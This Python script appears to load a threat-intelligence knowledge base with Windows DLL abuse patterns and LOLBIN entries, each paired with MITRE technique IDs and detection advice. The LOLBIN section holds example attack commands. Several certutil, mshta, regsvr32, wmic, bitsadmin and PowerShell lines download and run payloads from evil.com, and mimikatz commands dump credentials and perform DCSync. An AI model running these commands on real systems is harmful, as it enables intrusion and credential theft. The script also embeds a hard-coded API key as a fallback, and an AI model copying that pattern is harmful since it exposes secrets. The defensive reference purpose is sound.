#!/usr/bin/env python3
"""Deep Research: Windows DLLs, LOLBINs, and PE technical reference."""
import json, os, urllib.request

API = "http://localhost:8010"
KEY = os.environ.get("SK_API_KEY", "YxjXShQyv8L_-X_1Qb6DDSF9JvPXGer5_yTztqgvCAQ")

def mcp_call(tool, args, timeout=30):
    data = json.dumps({"tool": tool, "args": args}).encode()
    req = urllib.request.Request(f"{API}/api/v1/mcp/call", data=data, headers={"X-API-Key": KEY, "Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return json.loads(resp.read())

def create_entity(name, kind):
    try:
        r = mcp_call("create_entity", {"name": name, "kind": kind})
        return r.get("id")
    except:
        try:
            req = urllib.request.Request(f"{API}/api/v1/entities/?limit=1000", headers={"X-API-Key": KEY})
            with urllib.request.urlopen(req, timeout=30) as resp:
                for e in json.loads(resp.read()):
                    if e.get("canonical_name") == name: return e["id"]
        except: pass
        return None

def add_claim(eid, ctype, value, conf=1.0, src=""):
    if not eid: return
    try:
        mcp_call("create_claim", {"entity_id": eid, "claim_type": ctype, "value": value, "confidence": conf})
    except: pass

def dll_research():
    print("\n=== Windows DLL Reference ===")
    dlls = [
        {"name": "kernel32.dll", "desc": "Core Win32 API DLL. Memory management, I/O, process/thread creation. Loaded by nearly every Windows process.", "exports": ["VirtualAlloc","VirtualAllocEx","VirtualProtect","VirtualProtectEx","VirtualFree","VirtualFreeEx","CreateProcessA/W","CreateRemoteThread","CreateRemoteThreadEx","OpenProcess","ReadProcessMemory","WriteProcessMemory","LoadLibraryA/W","GetProcAddress","FreeLibrary","GetModuleHandleA/W","CreateFileA/W","ReadFile","WriteFile","CloseHandle","WaitForSingleObject","ExitProcess","GetCommandLineA/W","GetEnvironmentVariable","SetEnvironmentVariable","HeapAlloc","HeapFree","HeapCreate","HeapDestroy","CreateMutexA/W","OpenMutexA/W","CreatePipe","ConnectNamedPipe","CreateNamedPipeA/W"], "abuse": "VirtualAllocEx+WriteProcessMemory+CreateRemoteThread = classic DLL injection pattern. LoadLibrary+GetProcAddress = dynamic API resolution to evade static analysis. CreateRemoteThread for process injection across all ransomware and APT tooling.", "detect": "Monitor for cross-process VirtualAllocEx/WriteProcessMemory calls via ETW Threat Intelligence provider. Sysmon Event ID 10 for ProcessAccess. Event ID 8 for CreateRemoteThread."},
        {"name": "ntdll.dll", "desc": "Native NT API. Lowest user-mode interface to kernel. Direct syscalls bypass user-mode API hooks.", "exports": ["NtCreateFile","NtReadFile","NtWriteFile","NtClose","NtAllocateVirtualMemory","NtFreeVirtualMemory","NtProtectVirtualMemory","NtCreateSection","NtMapViewOfSection","NtUnmapViewOfSection","NtQuerySystemInformation","NtQueryInformationProcess","NtSetInformationProcess","NtCreateThreadEx","NtQueueApcThread","NtWaitForSingleObject","NtOpenProcess","NtOpenThread","NtReadVirtualMemory","NtWriteVirtualMemory","NtCreateProcessEx","RtlInitUnicodeString","RtlAdjustPrivilege","ZwCreateFile","ZwSetValueKey"], "abuse": "Direct syscall invocation bypasses EDR hooks on kernel32/advapi32. NtAllocateVirtualMemory+NtWriteVirtualMemory+NtCreateThreadEx = unhooked process injection. NtCreateSection+NtMapViewOfSection = section injection (fileless). RtlAdjustPrivilege for privilege escalation. Direct NT syscalls increasingly used by ransomware (LockBit 3.0, BlackCat) and EDR evasion frameworks.", "detect": "ETW Threat Intelligence provider for NT API calls. Kernel callback for NtCreateThreadEx from suspicious sources. User-mode hooking of ntdll still works for basic detection. Behavioral correlation of syscall sequences."},
        {"name": "advapi32.dll", "desc": "Advanced Windows API. Security, registry, services, event logs.", "exports": ["RegOpenKeyExA/W","RegSetValueExA/W","RegQueryValueExA/W","RegDeleteValueA/W","RegCloseKey","CreateServiceA/W","StartServiceA/W","OpenServiceA/W","ControlService","DeleteService","OpenProcessToken","AdjustTokenPrivileges","LookupPrivilegeValueA/W","GetTokenInformation","SetTokenInformation","ImpersonateLoggedOnUser","RevertToSelf","CreateProcessAsUserA/W","LogonUserA/W","InitiateSystemShutdownExA/W","CryptAcquireContext","CryptGenRandom","CryptEncrypt","CryptDecrypt","CredEnumerateA/W","CredReadA/W"], "abuse": "AdjustTokenPrivileges for SeDebugPrivilege/SeBackupPrivilege escalation. CreateService for persistence via Windows services. Registry APIs for persistence (Run keys, Image File Execution Options). CryptEncrypt for custom ransomware encryption. CredEnumerate for credential harvesting. CreateProcessAsUser for lateral movement.", "detect": "Sysmon Event ID 12/13/14 for registry modification. Event ID 7045 for service creation. ETW for token manipulation. Monitor SeDebugPrivilege acquisition by non-admin processes."},
        {"name": "crypt32.dll", "desc": "Certificate and cryptographic messaging functions. X.509 certificate handling.", "exports": ["CertOpenStore","CertOpenSystemStoreA/W","CertEnumCertificatesInStore","CertFindCertificateInStore","CertGetCertificateContextProperty","CertFreeCertificateContext","CertCloseStore","CertAddCertificateContextToStore","CertDeleteCertificateFromStore","CryptDecodeObjectEx","CryptQueryObject","CryptExportPKCS8","PFXImportCertStore","CertVerifyTimeValidity"], "abuse": "Certificate store manipulation for code signing bypass. PFXImportCertStore for importing stolen certificates. CertDeleteCertificateFromStore for removing security certificates (SUNBURST removed Digital Signature tab). CryptQueryObject for cert extraction from signed binaries. Used in supply chain attacks and code signing abuse.", "detect": "Monitor for CertDeleteCertificateFromStore calls. Track PFXImportCertStore from unusual processes. Certificate store modification alerts. Code signing certificate creation from non-standard processes."},
        {"name": "ws2_32.dll", "desc": "Windows Sockets 2 API. TCP/UDP network communication.", "exports": ["WSAStartup","WSACleanup","socket","connect","send","recv","closesocket","bind","listen","accept","select","WSAConnect","WSASend","WSARecv","getaddrinfo","gethostbyname","inet_addr","inet_ntoa","setsockopt","getsockopt","ioctlsocket","WSASocketA/W","WSAAddressToStringA/W"], "abuse": "Custom C2 sockets bypassing HTTP/HTTPS protocols. Raw socket creation for port scanning. Connect-back shells. DNS-over-raw-socket for covert C2 (APT29). Encrypted C2 channels using custom protocols. getaddrinfo/gethostbyname for C2 domain resolution. Many malware families use raw Winsock for network IO to avoid application-layer monitoring.", "detect": "Network flow analysis for unusual destinations. DNS monitoring for suspicious lookups. ETW network provider for connection events. Sysmon Event ID 3 for network connections. TLS fingerprinting for custom implementations."},
        {"name": "vaultcli.dll", "desc": "Windows Vault API. Access to Credential Locker (saved credentials, Windows credentials).", "exports": ["VaultOpenVault","VaultCloseVault","VaultEnumerateVaults","VaultEnumerateItems","VaultGetItem","VaultAddItem","VaultRemoveItem","VaultFree","VaultGetInformation"], "abuse": "VaultGetItem extracts saved credentials from Windows Vault (Edge saved passwords, Windows credentials, Credential Manager entries). Used by Mimikatz vault module. Credential harvesting for lateral movement. Steals VPN credentials, RDP credentials, and web passwords stored in browsers using Windows Vault.", "detect": "Monitor VaultGetItem calls from non-credential-manager processes. Sysmon Event ID 10 for process access to lsass.exe. Credential Manager API call logging via ETW."},
    ]
    for dll in dlls:
        eid = create_entity(dll["name"], "dll")
        if eid:
            add_claim(eid, "capability", {"text": dll["desc"], "exported_functions": dll["exports"], "function_count": len(dll["exports"])}, 1.0, "Microsoft PE reference, security research")
            add_claim(eid, "technique", {"text": dll["abuse"], "abuse_type": "DLL function abuse"}, 0.95, "MITRE ATT&CK, threat intel analysis")
            add_claim(eid, "detection", {"text": dll["detect"]}, 0.9, "EDR/defensive research")
            print(f"  + {dll['name']} ({len(dll['exports'])} exports)")

def lolbin_research():
    print("\n=== LOLBINs ===")
    lolbins = [
        {"name": "certutil.exe", "desc": "Certificate services tool. Legitimate: certificate management. Abuse: download files (-urlcache -split -f), encode/decode files (-encode/-decode), base64 payload staging. Used by: APT29, Lazarus, FIN7, TrickBot, Emotet, QakBot. Detection: certutil with -urlcache or -encode flags, network connections from certutil.", "techniques": ["T1105","T1140","T1027"], "commands": ["certutil -urlcache -split -f http://evil.com/payload.exe C:\\temp\\payload.exe", "certutil -encode payload.exe payload.b64", "certutil -decode payload.b64 payload.exe"]},
        {"name": "mshta.exe", "desc": "Microsoft HTML Application host. Executes .hta files with full IE rendering engine + script access. Abuse: download+execute VBScript/JScript from remote URL. Bypasses AppLocker (trusted Windows binary). Used by: APT28, APT29, FIN7, Cobalt Group, BazarLoader, TrickBot. Detection: mshta.exe with remote URL argument, mshta spawning cmd/powershell, network connections from mshta.", "techniques": ["T1218.005"], "commands": ["mshta vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"powershell -enc BASE64\"\":close\")", "mshta http://evil.com/payload.hta"]},
        {"name": "rundll32.exe", "desc": "Execute DLL functions. Legitimate: control panel, shell extensions. Abuse: execute arbitrary DLL exports, execute JavaScript via ieadvpack.dll, side-load malicious DLLs. Used by:几乎所有APT and ransomware groups. Detection: rundll32 with suspicious DLL paths, unusual export function names, network connections.", "techniques": ["T1218.011"], "commands": ["rundll32.exe payload.dll,EntryPoint", "rundll32.exe ieadvpack.dll,LaunchHTA http://evil.com/payload.hta", "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \""]},
        {"name": "regsvr32.exe", "desc": "Register/unregister DLLs. Abuse: execute COM scriptlets (.sct) from remote URL (Squiblydoo technique). Bypasses AppLocker and software restriction policies. Used by: FIN7, APT28, APT29, Emotet. Detection: regsvr32 with /i and scrobj.dll, network connections from regsvr32, regsvr32 spawning child processes.", "techniques": ["T1218.010"], "commands": ["regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll"]},
        {"name": "wmic.exe", "desc": "WMI command-line tool. Abuse: remote command execution (wmic /node:), process creation via WMI, XSL script execution from remote URL, system info harvesting. Used by: APT28, APT29, FIN7, TrickBot, Ryuk. Detection: wmic with /node: for remote execution, wmic process call create, wmic with format: and http:// URL.", "techniques": ["T1047","T1218.005"], "commands": ["wmic /node:192.168.1.10 /user:admin /password:pass process call create \"cmd.exe /c payload.exe\"", "wmic os get /format:\"http://evil.com/payload.xsl\""]},
        {"name": "powershell.exe", "desc": "Windows PowerShell. Most abused legitimate binary. Abuse: download+execute (IEX, Invoke-WebRequest), encoded commands (-enc), bypass execution policy, reflective DLL injection, AMSI bypass, token manipulation. Used by: EVERY threat actor. Detection: -enc flag, IEX/Invoke-Expression in scripts, DownloadString, AMSI bypass attempts, long command lines, base64 encoded content.", "techniques": ["T1059.001","T1027","T1562.001"], "commands": ["powershell -enc BASE64", "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')", "powershell -ExecutionPolicy Bypass -File payload.ps1"]},
        {"name": "bitsadmin.exe", "desc": "Background Intelligent Transfer Service tool. Abuse: download files from remote servers, upload data, create persistent download jobs. Less monitored than certutil or PowerShell. Used by: APT28, Cobalt Group, FIN7. Detection: bitsadmin with /transfer and remote URL, persistent download jobs, unusual file paths.", "techniques": ["T1197","T1105"], "commands": ["bitsadmin /transfer n http://evil.com/payload.exe C:\\temp\\payload.exe"]},
        {"name": "mimikatz.exe", "desc": "Credential harvesting tool. Key commands: sekurlsa::logonpasswords (dump LSASS), sekurlsa::wdigest, kerberos::ptt (pass-the-ticket), kerberos::golden (golden ticket), lsadump::dcsync (domain hash dump), crypto::certificates, vault::cred. Detection: LSASS process access, credential provider registration, SeDebugPrivilege acquisition, DCSync replication requests (Event ID 4662).", "techniques": ["T1003.001","T1550.003","T1558.001"], "commands": ["mimikatz.exe \"sekurlsa::logonpasswords\"", "mimikatz.exe \"kerberos::ptt ticket.kirbi\"", "mimikatz.exe \"lsadump::dcsync /domain:corp.local /user:admin\""]},
    ]
    for lb in lolbins:
        eid = create_entity(lb["name"], "tool")
        if eid:
            add_claim(eid, "capability", {"text": lb["desc"], "legitimate": True, "techniques": lb["techniques"], "example_commands": lb.get("commands", [])}, 1.0, "MITRE ATT&CK, LOLBAS project, DFIR analysis")
            add_claim(eid, "detection", {"text": lb["desc"].split("Detection: ")[1] if "Detection: " in lb["desc"] else ""}, 0.9, "EDR/defensive research")
            print(f"  + {lb['name']}")


def main():
    print("=== DLL & LOLBIN Research ===")
    dll_research()
    lolbin_research()
    print("\n=== Done ===")

if __name__ == "__main__":
    main()
